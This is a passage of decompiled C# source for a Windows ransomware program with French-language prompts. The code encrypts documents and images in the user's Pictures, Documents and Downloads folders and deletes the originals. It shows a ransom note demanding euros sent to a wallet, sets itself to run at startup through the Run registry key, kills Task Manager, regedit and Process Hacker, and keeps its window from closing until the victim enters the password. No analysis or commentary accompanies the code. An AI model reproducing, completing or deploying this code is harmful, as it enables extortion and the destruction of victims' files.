			fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
			fsOutput.SetLength(0L);
			byte[] buffer = new byte[4097];
			long num = 0L;
			long length = fsInput.Length;
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			CryptoStream cryptoStream = default(CryptoStream);
			switch (Direction)
			{
			case CryptoAction.ActionEncrypt:
				cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
				break;
			case CryptoAction.ActionDecrypt:
				cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
				break;
			}
			int num2;
			for (; num < length; num = checked(num + num2))
			{
				num2 = fsInput.Read(buffer, 0, 4096);
				cryptoStream.Write(buffer, 0, num2);
			}
			cryptoStream.Close();
			fsInput.Close();
			fsOutput.Close();
			if (Direction == CryptoAction.ActionEncrypt)
			{
				FileInfo fileInfo = new FileInfo(strFileToEncrypt);
				fileInfo.Delete();
			}
			if (Direction == CryptoAction.ActionDecrypt)
			{
				FileInfo fileInfo2 = new FileInfo(strFileToDecrypt);
				fileInfo2.Delete();
			}
		}
		catch (Exception projectError) when (((Func<bool>)delegate
		{
			// Could not convert BlockContainer to single expression
			ProjectData.SetProjectError(projectError);
			return Information.Err().get_Number() == 53;
		}).Invoke())
		{
			Interaction.MsgBox((object)"Please check to make sure the path and filenameare correct and if the file exists.", (MsgBoxStyle)48, (object)"Invalid Path or Filename");
			ProjectData.ClearProjectError();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			fsInput.Close();
			fsOutput.Close();
			if (Direction == CryptoAction.ActionDecrypt)
			{
				FileInfo fileInfo3 = new FileInfo(txtDestinationDecrypt.get_Text());
				fileInfo3.Delete();
				txtPassDecrypt.set_Text("");
				Interaction.MsgBox((object)"Please check to make sure that you entered the correctpassword.", (MsgBoxStyle)48, (object)"Invalid Password");
			}
			else
			{
				FileInfo fileInfo4 = new FileInfo(txtDestinationEncrypt.get_Text());
				fileInfo4.Delete();
				txtPassEncrypt.set_Text("");
				Interaction.MsgBox((object)"This file cannot be encrypted.", (MsgBoxStyle)48, (object)"Invalid File");
			}
			ProjectData.ClearProjectError();
		}
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (Operators.CompareString(fin, "1", false) == 0)
		{
			((CancelEventArgs)(object)e).Cancel = false;
		}
		else
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private ArrayList ListeFichier(DirectoryInfo repertoire, bool Reset)
	{
		if (Reset)
		{
			ListeInfo.Clear();
		}
		if (repertoire.GetDirectories().Length != 0)
		{
			DirectoryInfo[] directories = repertoire.GetDirectories();
			foreach (DirectoryInfo repertoire2 in directories)
			{
				ListeFichier(repertoire2, Reset: false);
			}
		}
		FileInfo[] array = repertoire.GetFiles("*.*");
		foreach (FileInfo fileInfo in array)
		{
			ListeInfo.Add(fileInfo.get_Name());
		}
		return ListeInfo;
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		ecran();
		ChercheImages(new DirectoryInfo(Conversions.ToString(Pictures)), new string[2] { "jpg", "png" });
		ChercheImages(new DirectoryInfo(Conversions.ToString(Documents)), new string[8] { "docx", "txt", "jpg", "pdf", "doc", "png", "xls", "xlsx" });
		ChercheImages(new DirectoryInfo(Conversions.ToString(Downloads)), new string[8] { "docx", "txt", "jpg", "pdf", "doc", "png", "xls", "xlsx" });
		try
		{
			TextBox3.set_Text("Veuillez envoyer " + montant_wallet + " €  sur le wallet  : \r\n " + wc4 + "\r\n\r\nEnvoyez un mail à \r\n" + wc6 + "\r\n\r\nDès votre règlement effectué vous recevrez le mot de passe pour retrouver vos fichiers.");
			Timer1.Start();
			Timer2.Start();
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(Application.get_ProductName()));
			if (objectValue == null)
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\currentVersion\\Run");
				RegistryKey registryKey3 = registryKey2;
				registryKey3.OpenSubKey("Software\\Microsoft\\Windows\\currentVersion\\Run");
				registryKey3.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
				registryKey3 = null;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, "taskmgr", false) == 0)
				{
					process.Kill();
				}
				if (Operators.CompareString(process.ProcessName, "regedit", false) == 0)
				{
					process.Kill();
				}
				if (Operators.CompareString(process.ProcessName, "ProcessHacker", false) == 0)
				{
					process.Kill();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		((Form)this).set_TopMost(true);
		((Form)this).set_TopMost(false);
	}

	private void Button6_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(TextBox7.get_Text(), wc2, false) == 0)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\currentVersion\\Run", writable: true);
			registryKey.DeleteValue(Application.get_ProductName());
			DecrypteChercheImages(new DirectoryInfo(Conversions.ToString(Pictures)), new string[1] { "*.encrypt" });
			DecrypteChercheImages(new DirectoryInfo(Conversions.ToString(Downloads)), new string[1] { "*.encrypt" });
			DecrypteChercheImages(new DirectoryInfo(Conversions.ToString(Documents)), new string[1] { "*.encrypt" });
			fin = "1";
			((Form)this).Close();
		}
	}

	private void Button4_Click(object sender, EventArgs e)
	{
		((Control)Panel1).Show();
	}

	private void Button5_Click(object sender, EventArgs e)
	{
		((Control)Panel2).Show();
	}
}
